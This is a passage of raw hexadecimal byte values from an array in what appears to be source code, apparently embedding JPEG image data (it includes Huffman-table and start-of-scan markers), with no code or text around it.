0x6A, 0xCB, 0x74, 0x10, 0x21, 0xE8, 0xED, 0x27, 0x7C, 0x11, 0x8F, 0x9A, 0x1A, 0x7A, 0x2F, 0xCF, 0x12, 0x9E, 0x42, 0x9F, 0xBE, 0x72, 0x77, 0x90, 0x6A, 0x77, 0x6A, 0x55, 0x40, 0x06, 0xA1, 0xAF, 0x79, 0x3A, 0x86, 0x53, 0xE8, 0x6F, 0x02, 0x0E, 0x9E, 0xB5, 0x4F, 0x02, 0x57, 0x80, 0xD9, 0x72, 0x06, 0x4D, 0x72, 0x9A, 0xD3, 0xF4, 0xAA, 0x9C, 0xBA, 0x25, 0x1D, 0x41, 0x86, 0x29, 0xA7, 0x8A, 0x27, 0xD5, 0x7E, 0xC2, 0xFE, 0x6A, 0x22, 0xE2, 0x78, 0x51, 0xE3, 0x54, 0xB2, 0x10, 0xD6, 0xC6, 0x23, 0x7A, 0x3C, 0x2E, 0x3A, 0x0A, 0x2A, 0x4F, 0xDF, 0xC9, 0xCF, 0x4D, 0x04, 0xD1, 0x1D, 0xDE, 0xFE, 0xE4, 0xFB, 0x11, 0x32, 0xB1, 0x56, 0x17, 0xFD, 0x58, 0x09, 0x38, 0x58, 0x27, 0xA3, 0xFD, 0xD0, 0xD9, 0x82, 0x3F, 0x0D, 0xFD, 0x7F, 0x30, 0xD9, 0xDA, 0xEF, 0xE2, 0xBF, 0x61, 0x7F, 0x35, 0x11, 0x71, 0x3C, 0x28, 0xF1, 0xAA, 0x59, 0x08, 0x6B, 0x63, 0x12, 0x3D, 0x39, 0xAC, 0x18, 0x15, 0x4A, 0xFC, 0x95, 0x44, 0x05, 0x4E, 0x8C, 0x6C, 0xFC, 0x08, 0x37, 0xDB, 0x68, 0x0F, 0x81, 0x85, 0x78, 0x0A, 0x03, 0x6D, 0x29, 0x37, 0x89, 0x35, 0x65, 0xBD, 0x06, 0x7A, 0xD7, 0x43, 0x04, 0x99, 0x2F, 0x3F, 0x11, 0x24, 0x0A, 0xDD, 0xCC, 0xFE, 0xFA, 0x1F, 0x78, 0xC6, 0x49, 0x7F, 0x0D, 0xFC, 0xB5, 0xE6, 0xA7, 0xA8, 0xBE, 0xD8, 0x5F, 0x69, 0x12, 0x51, 0x7B, 0xD6, 0x8A, 0x81, 0xF9, 0x97, 0x24, 0x9B, 0x78, 0x8E, 0xC3, 0x69, 0xA5, 0x44, 0xB3, 0xA4, 0x3C, 0xCB, 0xA9, 0x5C, 0x47, 0xDF, 0x54, 0x37, 0x2F, 0x75, 0xEB, 0xEF, 0x49, 0x54, 0xB9, 0xD2, 0x50, 0x28, 0xA9, 0x59, 0x38, 0xED, 0x03, 0x72, 0x24, 0x67, 0xA3, 0x12, 0x33, 0x13, 0xE7, 0x04, 0x10, 0x9E, 0x7C, 0x17, 0xE1, 0xA0, 0x29, 0x82, 0x1F, 0x46, 0x3D, 0xAB, 0x04, 0x54, 0x95, 0x9A, 0xA8, 0x45, 0xCD, 0xDB, 0xB9, 0x52, 0x21, 0x1E, 0x86, 0xD5, 0x8A, 0x0C, 0xB4, 0xD8, 0xAA, 0x23, 0xE0, 0x2B, 0x8D, 0x52, 0xD1, 0xFD, 0xF5, 0x9A, 0x7D, 0x52, 0x9D, 0xAA, 0x75, 0x68, 0x00, 0xA1, 0x85, 0x16, 0xE6, 0xDB, 0x1F, 0x70, 0x64, 0x7A, 0xE5, 0x93, 0x56, 0x53, 0xF4, 0xF9, 0xBE, 0x96, 0xA5, 0x6E, 0x74, 0x0D, 0x0B, 0x5B, 0x2E, 0xF4, 0xB3, 0xA9, 0x60, 0xE2, 0x5D, 0xCE, 0x55, 0xD4, 0x4B, 0x34, 0x8B, 0xD0, 0x5E, 0x7A, 0x0F, 0x66, 0x4E, 0xFF, 0x00, 0x4A, 0x02, 0x2A, 0xA2, 0xB7, 0x94, 0xB1, 0x3C, 0xF0, 0x03, 0xFA, 0x7D, 0xE8, 0x7D, 0x44, 0x7E, 0x8D, 0x4C, 0xD3, 0xFC, 0xAC, 0x02, 0x8A, 0x89, 0x2D, 0xA4, 0x2F, 0x4A, 0xBE, 0xDB, 0x95, 0x99, 0x76, 0x76, 0x15, 0x24, 0x6C, 0x7B, 0x25, 0xEB, 0x0D, 0xCF, 0x6E, 0xBF, 0x3C, 0x56, 0x38, 0x6F, 0xC5, 0xFC, 0x1F, 0x9D, 0xCA, 0x77, 0x43, 0xFD, 0x8F, 0xF4, 0xA6, 0x02, 0x33, 0xBE, 0xA0, 0xF2, 0xF0, 0xBD, 0x35, 0x3A, 0x70, 0x33, 0x53, 0x35, 0x57, 0xB5, 0xAF, 0x72, 0xEE, 0xA5, 0x00, 0x52, 0xA6, 0x7D, 0x34, 0xA6, 0x61, 0x2E, 0xAD, 0x6E, 0xD1, 0xE9, 0x1E, 0x6D, 0xE7, 0x3A, 0xA6, 0xB5, 0xC2, 0x86, 0x2E, 0xEF, 0xCD, 0xC4, 0x8F, 0xAE, 0x6D, 0xB6, 0x33, 0xF2, 0x5D, 0xF6, 0xBE, 0x61, 0x2D, 0xA1, 0xBA, 0xAE, 0xE9, 0xB8, 0x17, 0x15, 0xFA, 0x3B, 0x2C, 0xD2, 0x27, 0x0D, 0x36, 0x15, 0x92, 0x68, 0x8A, 0x5E, 0x41, 0x6B, 0x43, 0x5E, 0x6C, 0x19, 0xA2, 0xC6, 0x8D, 0xA5, 0x3F, 0x3F, 0xCA, 0x8C, 0x9F, 0xDA, 0x44, 0x80, 0xC5, 0xF4, 0x66, 0xED, 0x7F, 0x14, 0x22, 0x1C, 0xEA, 0xD6, 0x2C, 0xCB, 0x00, 0xC6, 0x33, 0xFA, 0xB7, 0xD8, 0x3E, 0xE5, 0x49, 0x5A, 0x24, 0x39, 0xDE, 0x9A, 0x99, 0x76, 0x78, 0x17, 0xEC, 0xED, 0x9F, 0xA5, 0x1B, 0x06, 0xCC, 0x69, 0x8E, 0x72, 0xA9, 0x27, 0x0B, 0x4E, 0x06, 0x76, 0xC3, 0x7F, 0xF1, 0x0B, 0x96, 0x5A, 0x29, 0x5A, 0xC2, 0xA3, 0x3B, 0xE5, 0xDD, 0x0D, 0xD5, 0xDA, 0x64, 0x25, 0xE3, 0x49, 0x64, 0x0F, 0x41, 0x27, 0x48, 0xFA, 0xEA, 0x39, 0x9F, 0x23, 0x3B, 0xFC, 0x34, 0xC3, 0x26, 0x63, 0x6B, 0xDB, 0x88, 0x24, 0xC8, 0xCD, 0xB1, 0x2A, 0x49, 0xBF, 0x9A, 0x1C, 0x5A, 0x4D, 0x21, 0x76, 0x96, 0xDB, 0xE7, 0x9F, 0xC8, 0x94, 0xD4, 0xF3, 0xA8, 0xBF, 0x3F, 0x83, 0x15, 0xD3, 0x05, 0xA6, 0xB1, 0xF1, 0xB7, 0xF0, 0xD0, 0x8D, 0xA0, 0xC3, 0xBC, 0x99, 0x19, 0xA8, 0x74, 0x88, 0x4D, 0x76, 0xEA, 0xDA, 0x5D, 0x31, 0xA9, 0x9D, 0xD7, 0x9B, 0xE7, 0x88, 0x8D, 0x3E, 0xE6, 0x1D, 0xB4, 0xAA, 0x65, 0x3B, 0x10, 0xCF, 0x95, 0x6A, 0x71, 0x56, 0x09, 0x7F, 0x1E, 0x67, 0x84, 0x70, 0x4B, 0x2B, 0x74, 0x52, 0x6D, 0x75, 0x99, 0x4C, 0x2C, 0xE1, 0xE5, 0xD7, 0xE1, 0xB4, 0x1F, 0x3D, 0x1F, 0x92, 0x15, 0xB5, 0x25, 0xF2, 0x7E, 0x70, 0x9E, 0xE6, 0x32, 0x37, 0xF2, 0x4C, 0xA2, 0x15, 0xAC, 0x84, 0x6D, 0x7A, 0xB4, 0x99, 0xB0, 0x51, 0x27, 0xBD, 0x20, 0x96, 0xDF, 0x31, 0xAD, 0x24, 0xF2, 0x3B, 0x2E, 0x79, 0x92, 0x1E, 0x2A, 0x8A, 0x7F, 0xBB, 0x3F, 0xE0, 0xE6, 0x47, 0xF5, 0x3F, 0xEC, 0xAF, 0x21, 0x2E, 0x7A, 0x51, 0xFB, 0x32, 0x16, 0x5C, 0x25, 0x01, 0x24, 0xA1, 0x30, 0x7F, 0x5A, 0x1C, 0x30, 0xDA, 0x62, 0xA5, 0x33, 0xDF, 0x37, 0x82, 0xFB, 0x64, 0x2C, 0xC8, 0x57, 0x4F, 0x99, 0x28, 0x0D, 0x80, 0x07, 0x41, 0xC3, 0x59, 0x52, 0x09, 0xEC, 0xCF, 0x0C, 0x1E, 0x79, 0x92, 0x1E, 0x2A, 0x8A, 0x7F, 0xBB, 0x3F, 0xE0, 0xE6, 0x47, 0xF5, 0x3F, 0xED, 0x5F, 0x9E, 0xA5, 0xAB, 0xB3, 0xEC, 0x4A, 0x37, 0xFE, 0x77, 0xE2, 0xBE, 0xEF, 0xD7, 0xF8, 0xD5, 0x75, 0x37, 0xF4, 0xE5, 0x2F, 0x5C, 0x2C, 0x3E, 0x44, 0xB4, 0xBA, 0x45, 0xAD, 0xCD, 0x02, 0xAD, 0xBB, 0x07, 0x75, 0x12, 0x5D, 0xB7, 0x96, 0xBD, 0x78, 0x16, 0xFD, 0x15, 0x82, 0x42, 0x5E, 0xA8, 0x9D, 0x89, 0x12, 0x27, 0xA6, 0x10, 0xA2, 0x6A, 0xEC, 0xA6, 0xAF, 0x1F, 0x41, 0x5D, 0x14, 0x8E, 0x73, 0xC7, 0x46, 0x8D, 0x5A, 0x2B, 0x90, 0x72, 0x99, 0x79, 0xAD, 0x37, 0xD8, 0x11, 0xF7, 0xEC, 0x74, 0x57, 0x36, 0x0C, 0xCE, 0x93, 0x43, 0x22, 0xFC, 0x67, 0x3F, 0x6A, 0xBA, 0x54, 0x45, 0xF3, 0xC8, 0x0F, 0x58, 0x8E, 0x81, 0xE7, 0xD1, 0xBE, 0x78, 0xA0, 0x96, 0xD7, 0xB1, 0x93, 0x26, 0x30, 0x10, 0x86, 0x83, 0x37, 0x21, 0x58, 0x18, 0x24, 0xEB, 0xFF, 0x00, 0x5E, 0xF8, 0x48, 0x33, 0xBF, 0x86, 0x6E, 0xCD, 0xB0, 0xDF, 0x57, 0xE5, 0x3A, 0xD3, 0x20, 0xB7, 0x37, 0xA3, 0x6A, 0x51, 0x57, 0x53, 0x25, 0xD7, 0x90, 0x61, 0xB9, 0xD0, 0x0C, 0x77, 0x46, 0x8A, 0xEB, 0x6F, 0xE1, 0x54, 0xA9, 0x31, 0x5C, 0x61, 0x3F, 0x23, 0x41, 0xD5, 0xB4, 0x28, 0xA9, 0xB3, 0x6A, 0x17, 0xF5, 0x20, 0x28, 0xD8, 0x50, 0xB3, 0xCE, 0x2E, 0x2F, 0x41, 0xAD, 0x62, 0xEC, 0xC6, 0x14, 0x2E, 0xBF, 0x58, 0x2B, 0x71, 0x97, 0x25, 0xC5, 0xD2, 0x88, 0xFF, 0x00, 0x9C, 0x17, 0xAD, 0xB8, 0xBE, 0x37, 0x94, 0x45, 0x2A, 0x5D, 0xE4, 0xED, 0xD0, 0xFA, 0x56, 0x4D, 0xF5, 0xEA, 0xED, 0xA0, 0x2C, 0xE8, 0xA6, 0x4F, 0x86, 0x03, 0xE6, 0xE9, 0x82, 0x62, 0x29, 0x5F, 0x7E, 0xC6, 0xF0, 0x42, 0x2C, 0xD3, 0x01, 0x59, 0x99, 0xF3, 0xA5, 0xD9, 0x83, 0xD5, 0x31, 0xA1, 0xCB, 0x63, 0x24, 0xB5, 0x2C, 0x92, 0x05, 0x53, 0xDC, 0x43, 0xE3, 0xB6, 0x1F, 0xD0, 0x05, 0xAD, 0x28, 0x53, 0x6E, 0xA9, 0x5B, 0xEB, 0x2E, 0x4F, 0x8A, 0x19, 0x31, 0x9D, 0xB8, 0x27, 0x8D, 0xBF, 0x1B, 0xF3, 0x17, 0x7D, 0x4A, 0x41, 0xC0, 0x2D, 0x13, 0x2D, 0x9C, 0xC9, 0x4D, 0x9B, 0x1B, 0xC1, 0x48, 0x52, 0xEB, 0xC2, 0x9D, 0x78, 0x15, 0xB1, 0xCC, 0xEB, 0x32, 0x72, 0x64, 0xC2, 0x6A, 0xDF, 0xC9, 0xB4, 0xAC, 0x81, 0x1E, 0x6D, 0x9C, 0x26, 0x65, 0xC4, 0xF9, 0x94, 0x58, 0x65, 0xB5, 0x9B, 0x52, 0x40, 0xE6, 0x57, 0xB5, 0xE7, 0x17, 0xE7, 0x46, 0xD1, 0xB9, 0xA3, 0xA1, 0x72, 0x98, 0xD0, 0xC2, 0x9F, 0x2B, 0x56, 0x27, 0x2B, 0xBD, 0x76, 0x81, 0xD0, 0x4C, 0xFF, 0x00, 0x93, 0xFE, 0xE5, 0x91, 0x7E, 0x4F, 0x9C, 0xBC, 0x6F, 0xC7, 0x06, 0x5B, 0x15, 0xCA, 0xED, 0x52, 0x22, 0x63, 0x40, 0xBF, 0x08, 0x9A, 0xCE, 0x33, 0xE4, 0xC8, 0x2E, 0x3C, 0x3B, 0x46, 0x06, 0x8A, 0xCE, 0x34, 0x53, 0x73, 0x29, 0x7F, 0x35, 0x3A, 0x60, 0x0F, 0x3E, 0xCC, 0xB1, 0xBF, 0x81, 0x01, 0xB0, 0x2B, 0x4D, 0xB6, 0x6C, 0xCB, 0x27, 0x84, 0x4E, 0xA9, 0x72, 0x1F, 0xEA, 0x41, 0xE7, 0xAF, 0xD8, 0xBB, 0xD9, 0xFE, 0x27, 0x5D, 0x62, 0x10, 0x91, 0xB2, 0xE2, 0xA1, 0x29, 0x6D, 0xBE, 0xD8, 0x65, 0xDD, 0x6B, 0x7A, 0x7A, 0xE1, 0x1A, 0x2E, 0x45, 0x9B, 0x48, 0xC9, 0x8F, 0x0B, 0xF6, 0x54, 0xC0, 0xEA, 0xEF, 0xCE, 0xF6, 0x0B, 0x7E, 0x01, 0xDE, 0x08, 0x8E, 0xDF, 0xA5, 0x1E, 0xD8, 0xA1, 0xBB, 0xD1, 0xD5, 0x55, 0x52, 0xDE, 0xD2, 0x61, 0x6C, 0x83, 0x0E, 0x3F, 0xE6, 0x16, 0xB0, 0x4F, 0x92, 0x6E, 0x66, 0x5D, 0x68, 0x11, 0xD0, 0x2E, 0xFC, 0x88, 0xBD, 0xAE, 0x5D, 0x9C, 0x21, 0x3E, 0xC3, 0xB1, 0xEC, 0xA3, 0xCE, 0xF6, 0x3F, 0xFC, 0xE6, 0xFE, 0x7E, 0x21, 0x6D, 0x59, 0xB9, 0x59, 0xA3, 0x76, 0x92, 0xE6, 0x91, 0xAE, 0x2C, 0xAB, 0x2F, 0xCD, 0x33, 0xA5, 0x01, 0xA3, 0x5B, 0x1B, 0x0D, 0xA0, 0x57, 0x28, 0x43, 0x45, 0x74, 0x3F, 0x4F, 0x1C, 0x57, 0x65, 0x37, 0x05, 0xEB, 0x61, 0x29, 0x2C, 0xD8, 0x1E, 0x5A, 0xE5, 0xB8, 0x61, 0x95, 0x11, 0x77, 0xD9, 0xBE, 0x6F, 0x15, 0x92, 0xB0, 0xCB, 0x6B, 0x54, 0x67, 0x9D, 0x05, 0x6A, 0x05, 0x19, 0x81, 0xB4, 0x8E, 0xC3, 0x5C, 0x0A, 0x68, 0x26, 0x9D, 0x4B, 0x55, 0x56, 0xAB, 0x84, 0x52, 0x39, 0x84, 0xD8, 0x24, 0xB9, 0x4C, 0x69, 0xA3, 0xFF, 0x00, 0xD9, 0xCE, 0x3D, 0x37, 0x89, 0x75, 0xE1, 0xE6, 0x8B, 0x01, 0x77, 0x28, 0x21, 0x98, 0x6B, 0xA1, 0x26, 0x7E, 0xC5, 0xD5, 0xE8, 0x62, 0xD7, 0x99, 0xBE, 0xDC, 0x6D, 0x00, 0x3F, 0x35, 0x88, 0x3A, 0x9F, 0x53, 0x3F, 0x1B, 0x11, 0x66, 0xFD, 0x1A, 0x91, 0xBF, 0x81, 0x69, 0x24, 0x9A, 0x87, 0xDF, 0xE8, 0x80, 0xD0, 0xEA, 0x28, 0x3D, 0x5D, 0x46, 0x23, 0xA3, 0x68, 0x0A, 0x1A, 0x8A, 0xA7, 0xD4, 0xF9, 0xDD, 0x6F, 0xEA, 0xE5, 0x2E, 0x5B, 0x09, 0xDB, 0x63, 0x2A, 0xA8, 0x85, 0x7E, 0xC2, 0xFE, 0x6A, 0x22, 0xE2, 0x78, 0x51, 0xE3, 0x54, 0xB2, 0x10, 0xD6, 0xC6, 0x34, 0xEF, 0x8E, 0x34, 0xF6, 0x97, 0x83, 0x9A, 0xF9, 0xF3, 0x6B, 0x0C, 0x90, 0x86, 0xB1, 0xD1, 0x7A, 0xA3, 0xFA, 0x72, 0x0E, 0x0E, 0xFC, 0x2C, 0x53, 0x1C, 0x66, 0x38, 0xFD, 0x12, 0x2B, 0xDA, 0x7A, 0xAD, 0xB9, 0xBA, 0x9F, 0xD1, 0xA4, 0x44, 0x20, 0x0C, 0x00, 0xB5, 0x44, 0x29, 0x82, 0xEF, 0x5D, 0x9B, 0xAE, 0x2A, 0x11, 0x22, 0x85, 0xCC, 0x18, 0x95, 0xA0, 0x25, 0x1D, 0x9F, 0x4A, 0x76, 0x16, 0x34, 0xC6, 0x15, 0xAA, 0x8A, 0x8E, 0xC4, 0x81, 0xE0, 0xC6, 0x36, 0x02, 0xBF, 0xD7, 0xAB, 0x2C, 0x56, 0xF5, 0x50, 0xB5, 0x69, 0x8D, 0x46, 0x60, 0xA8, 0x01, 0xEA, 0xD5, 0x6E, 0xF4, 0x69, 0x94, 0x08, 0x3D, 0x89, 0x78, 0xAD, 0xE1, 0x32, 0x2B, 0xB3, 0x82, 0x6D, 0x8E, 0xC1, 0x16, 0x9C, 0x85, 0x9A, 0x92, 0xE4, 0x50, 0x03, 0xDB, 0x58, 0x86, 0xF6, 0xEF, 0x61, 0x6E, 0x02, 0xEB, 0xD9, 0x34, 0xC4, 0xC6, 0x8A, 0xFB, 0x8E, 0x33, 0x56, 0x2C, 0x6F, 0xF4, 0xB7, 0xA0, 0x1E, 0xD4, 0x46, 0x99, 0x01, 0xE9, 0xA9, 0x5B, 0x14, 0xE2, 0x9B, 0x6D, 0x7E, 0xA1, 0xCF, 0xDA, 0x2C, 0xCB, 0x5E, 0x0A, 0xFA, 0x6D, 0xBA, 0x4C, 0xEA, 0x1F, 0xEB, 0xCE, 0x35, 0x6D, 0x74, 0x87, 0x5B, 0xF7, 0xA4, 0xD9, 0x31, 0x65, 0x91, 0xCB, 0x33, 0xAA, 0xBE, 0xFA, 0x7B, 0x0A, 0xD4, 0x35, 0xD5, 0x5B, 0x92, 0x9C, 0xB3, 0x34, 0x56, 0xC3, 0xA2, 0x96, 0x7F, 0xA5, 0xB8, 0x51, 0x61, 0xCA, 0xDA, 0x65, 0x28, 0x8B, 0xCA, 0x08, 0x43, 0x0A, 0xC5, 0x53, 0xE8, 0xED, 0x09, 0x66, 0xBD, 0x73, 0x3C, 0xB5, 0x02, 0x51, 0x76, 0x88, 0xBC, 0xED, 0x97, 0x7F, 0xEF, 0xB1, 0xF3, 0x05, 0x65, 0x9A, 0x71, 0xD0, 0x7E, 0xE4, 0x58, 0x92, 0xE8, 0x77, 0x9C, 0x18, 0xEF, 0x2E, 0xCD, 0x17, 0x66, 0xFA, 0xF9, 0xDE, 0x74, 0x65, 0xAD, 0x13, 0x82, 0x19, 0xCD, 0x47, 0x9A, 0xA8, 0xD2, 0x96, 0xF8, 0x82, 0x1C, 0xB6, 0x12, 0x0E, 0x80, 0xA0, 0x23, 0xE8, 0x9E, 0x05, 0x4F, 0x68, 0x3E, 0x17, 0x30, 0x3E, 0xD9, 0x99, 0xA1, 0x5F, 0xA0, 0xBA, 0xC1, 0xBC, 0xA5, 0x48, 0x44, 0xAC, 0x26, 0x97, 0xEE, 0xB9, 0x4A, 0xD3, 0x8D, 0x30, 0x21, 0xB9, 0xE6, 0x48, 0x78, 0xAA, 0x29, 0xFE, 0xEC, 0xFF, 0x00, 0x83, 0x99, 0x1F, 0xD4, 0xFF, 0x00, 0xB5, 0x7E, 0x70, 0xAE, 0x96, 0x57, 0x19, 0x4B, 0x76, 0xD0, 0x08, 0x82, 0x22, 0x51, 0x2A, 0xBB, 0xE4, 0x68, 0xAC, 0x58, 0x6A, 0xA3, 0x9D, 0x38, 0x2C, 0x69, 0xA2, 0xBD, 0x00, 0x9D, 0x75, 0x83, 0x50, 0xDC, 0xD7, 0x0D, 0x2F, 0x28, 0xCA, 0x8C, 0x3E, 0xB5, 0x5C, 0x8D, 0xB4, 0x63, 0x28, 0xE1, 0x08, 0x0D, 0x3D, 0xE3, 0x56, 0x26, 0x29, 0x62, 0x43, 0x0A, 0xAF, 0x27, 0xCE, 0x14, 0x5F, 0x9E, 0x27, 0x31, 0x63, 0x46, 0x91, 0x55, 0x7F, 0x1B, 0x7C, 0xD4, 0xDB, 0xE5, 0xAB, 0x2E, 0xB5, 0xA1, 0x86, 0xE9, 0x1D, 0xDE, 0x71, 0xF1, 0x5F, 0x39, 0x92, 0xEB, 0xCD, 0xED, 0xBC, 0x30, 0xA4, 0x23, 0x2B, 0x1A, 0x9B, 0x4F, 0xDE, 0x40, 0x9F, 0xAC, 0xCE, 0x02, 0x22, 0x32, 0x66, 0xD9, 0xBA, 0x45, 0x54, 0x48, 0x81, 0xE5, 0x4C, 0x68, 0xCE, 0xF9, 0x93, 0x66, 0xF7, 0x10, 0x0E, 0x94, 0x67, 0x60, 0x2A, 0x8E, 0x38, 0x8C, 0xCF, 0xF0, 0xD3, 0x0C, 0x99, 0x8D, 0xAF, 0x6E, 0x20, 0x93, 0x23, 0x36, 0xC4, 0xA9, 0x26, 0xFE, 0x51, 0xE5, 0x4A, 0x03, 0x25, 0x6D, 0xD4, 0xE8, 0x1D, 0x72, 0xB5, 0xC6, 0x9C, 0x58, 0x63, 0x2A, 0xC0, 0x2C, 0x41, 0x47, 0xC2, 0xA9, 0xBB, 0x4A, 0x2C, 0xE2, 0xB4, 0x6A, 0xFE, 0x6E, 0xF9, 0x62, 0x39, 0xD4, 0xCC, 0x0B, 0xDA, 0xB8, 0xB5, 0x31, 0x70, 0x3E, 0x30, 0x53, 0xCF, 0x37, 0x59, 0x29, 0x5E, 0x5B, 0x37, 0x4D, 0x98, 0xB0, 0xB4, 0xD5, 0x05, 0x4C, 0xDE, 0x61, 0x53, 0x54, 0x48, 0xC5, 0xFD, 0xC9, 0x9F, 0xDE, 0x9D, 0x1D, 0xDA, 0x18, 0xF3, 0xFD, 0xDB, 0xFF, 0xC4, 0x00, 0x35, 0x10, 0x00, 0x02, 0x02, 0x02, 0x02, 0x01, 0x04, 0x02, 0x02, 0x00, 0x03, 0x05, 0x09, 0x00, 0x00, 0x00, 0x02, 0x03, 0x01, 0x04, 0x11, 0x12, 0x00, 0x05, 0x13, 0x14, 0x21, 0x22, 0x31, 0x32, 0x41, 0x15, 0x23, 0x06, 0x33, 0x70, 0x34, 0x43, 0x50, 0x52, 0x62, 0x20, 0x24, 0x25, 0x30, 0x42, 0x51, 0x61, 0x80, 0x82, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x13, 0x3F, 0x00, 0xFF, 0x00, 0x47, 0xAA, 0xF4, 0xD6, 0xAD, 0xA9, 0x00, 0x5D, 0x55, 0x77, 0xE0, 0x9B, 0x59, 0x06, 0x19, 0xF2, 0x99, 0x17, 0xCE, 0x79, 0x6F, 0xB3, 0x4D, 0x1B, 0x4E, 0x9B, 0x8A, 0xDC, 0xA2, 0x8D, 0x6D, 0x27, 0xD4, 0x36, 0x20, 0x64, 0xA4, 0x32, 0x1C, 0x84, 0xAF, 0xFD, 0x82, 0xBF, 0xF8, 0x7A, 0x2F, 0xC0, 0x66, 0x07, 0x3E, 0xCD, 0xF9, 0xE7, 0x81, 0x73, 0xD4, 0x91, 0xD7, 0x49, 0x2A, 0x0C, 0x1E, 0x3E, 0x30, 0x85, 0x38, 0x61, 0xE1, 0x38, 0x19, 0x31, 0xE0, 0x74, 0xEB, 0x6F, 0x4B, 0xE1, 0x3A, 0x35, 0x9E, 0x7E, 0xBA, 0xEC, 0xD5, 0x9F, 0x08, 0xEC, 0xD3, 0x93, 0x22, 0x78, 0xC8, 0x8F, 0x3D, 0x66, 0x1D, 0x16, 0xAD, 0x92, 0x94, 0x26, 0x08, 0x85, 0xCC, 0x12, 0x44, 0xDE, 0x22, 0x45, 0x27, 0x05, 0xC1, 0xB0, 0x30, 0xD9, 0x75, 0x27, 0xDA, 0x35, 0x01, 0xD6, 0x05, 0x08, 0x8A, 0xFC, 0x55, 0xE4, 0x04, 0xF7, 0xCC, 0xC8, 0xFF, 0x00, 0xC3, 0xA4, 0x87, 0xFA, 0xCB, 0xD1, 0xAE, 0x96, 0x13, 0xF1, 0xF6, 0x8D, 0x15, 0x13, 0xEF, 0x9F, 0x7E, 0x54, 0x72, 0x46, 0x6E, 0x57, 0xA1, 0x12, 0x29, 0xF3, 0x11, 0xA8, 0x88, 0x0E, 0x20, 0xA7, 0x26, 0xA9, 0x02, 0xE1, 0x18, 0x78, 0x49, 0xD6, 0x7A, 0xF8, 0xEB, 0x4C, 0x26, 0x35, 0xCF, 0x8B, 0xC7, 0xEF, 0x8C, 0xE7, 0x6E, 0x5E, 0x62, 0x8C, 0x69, 0x52, 0x22, 0x02, 0x24, 0xAB, 0xC6, 0x01, 0x25, 0xB7, 0x8C, 0x32, 0x6C, 0x92, 0x3C, 0x0F, 0x2B, 0x4D, 0x21, 0xAE, 0xFC, 0x55, 0x5D, 0x32, 0x18, 0x33, 0xAE, 0x4F, 0x08, 0x35, 0xAA, 0x20, 0xB5, 0x67, 0x00, 0xD5, 0xE8, 0x59, 0x76, 0x9C, 0x04, 0x29, 0xC5, 0x90, 0x96, 0x46, 0xB2, 0xA0, 0x2D, 0x44, 0xE0, 0x64, 0x87, 0x33, 0x1C, 0xB2, 0xD4, 0x95, 0x64, 0x5C, 0xEC, 0x49, 0xB2, 0xD6, 0x86, 0x8A, 0x13, 0xCE, 0x1C, 0x62, 0x30, 0x45, 0x23, 0x11, 0x3C, 0x66, 0x36, 0x73, 0x22, 0x3D, 0xCA, 0x71, 0x03, 0xFE, 0xA4, 0xA6, 0xB7, 0x52, 0x5E, 0x02, 0xA6, 0x75, 0xE1, 0x60, 0x92, 0x6D, 0x33, 0x2D, 0x30, 0xE9, 0xCE, 0xF2, 0x53, 0xC1, 0xB0, 0x3E, 0x7F, 0xFC, 0x29, 0xF6, 0x58, 0x22, 0x75, 0x81, 0x42, 0x22, 0x10, 0x94, 0x48, 0xC1, 0xEF, 0x99, 0x91, 0xE5, 0x1E, 0xD5, 0x5D, 0x83, 0x41, 0x20, 0x60, 0x04, 0xAB, 0xA0, 0xB0, 0x1F, 0x4E, 0xF8, 0xF2, 0x8F, 0xC3, 0x25, 0x1C, 0x9E, 0xDD, 0x3F, 0xC8, 0x99, 0xDB, 0x08, 0x90, 0x70, 0x52, 0x11, 0x22, 0xF0, 0x41, 0x16, 0x92, 0x44, 0x62, 0x5C, 0x1B, 0xF2, 0xD7, 0x15, 0xAE, 0xB3, 0xD4, 0x4E, 0x4D, 0x5E, 0x21, 0x80, 0x5B, 0x62, 0xA9, 0xE0, 0xB6, 0x9E, 0x2E, 0xD8, 0xDD, 0x91, 0x8A, 0xE0, 0xA9, 0x20, 0x70, 0x1A, 0x40, 0x44, 0xC7, 0xCE, 0x13, 0x1F, 0x94, 0x4F, 0x2D, 0xDB, 0x0A, 0xB5, 0xC1, 0x55, 0xFA, 0xE5, 0x5D, 0x61, 0x93, 0x54, 0x82, 0x20, 0x08, 0xDF, 0x11, 0x12, 0x26, 0x52, 0x53, 0xCB, 0x9D, 0xDD, 0x75, 0x5C, 0xCB, 0x5B, 0x2B, 0x35, 0xD3, 0x40, 0x09, 0xCD, 0x82, 0x56, 0x36, 0xF7, 0x90, 0x89, 0xE5, 0x57, 0xC1, 0x91, 0x57, 0xAF, 0xD1, 0x47, 0x65, 0x3E, 0x70, 0x34, 0x7F, 0xFA, 0x8D, 0x0E, 0x27, 0x33, 0x8F, 0xA1, 0xF7, 0x55, 0xFF, 0x00, 0x29, 0xD8, 0xAF, 0x4F, 0xC7, 0x26, 0x97, 0xFF, 0x00, 0x50, 0xC2, 0x5D, 0x87, 0x87, 0xB0, 0xEE, 0x3C, 0x45, 0xB9, 0xB4, 0xB3, 0x45, 0xEF, 0x24, 0x06, 0x4A, 0x56, 0xAC, 0x1C, 0x12, 0x4A, 0x08, 0x79, 0xDC, 0x76, 0x61, 0xD7, 0xA2, 0x4A, 0x87, 0x60, 0x75, 0x42, 0xB8, 0x38, 0x2B, 0xF8, 0xE5, 0xC7, 0x11, 0xF0, 0x03, 0xD7, 0xDB, 0xEC, 0xB9, 0xD5, 0x51, 0x0E, 0xC6, 0xEC, 0x23, 0xD0, 0x59, 0x7E, 0x8A, 0x54, 0xA2, 0xD6, 0x7E, 0x6A, 0x1C, 0xC8, 0x84, 0xF2, 0xAF, 0x4E, 0xA6, 0x77, 0x67, 0xD7, 0x87, 0x5A, 0xEB, 0x41, 0x0F, 0xA3, 0xE9, 0x5B, 0x2B, 0x71, 0x18, 0x47, 0xD2, 0x60, 0xB4, 0xE7, 0x75, 0x40, 0x2A, 0x3C, 0x1F, 0x69, 0xF1, 0x5A, 0xD4, 0xBE, 0xB8, 0x2E, 0xBE, 0x62, 0xB1, 0xE7, 0x5C, 0x80, 0x49, 0x17, 0x2E, 0x53, 0xA8, 0x16, 0x68, 0xF6, 0x1D, 0x6D, 0x32, 0xB4, 0xB3, 0x0F, 0x02, 0x96, 0x06, 0x92, 0x81, 0x9C, 0x89, 0x8F, 0x0E, 0xB0, 0x0D, 0xA1, 0xB9, 0x5A, 0xB4, 0xBC, 0x6E, 0xDA, 0x07, 0x86, 0x42, 0x4B, 0xD8, 0x92, 0xAF, 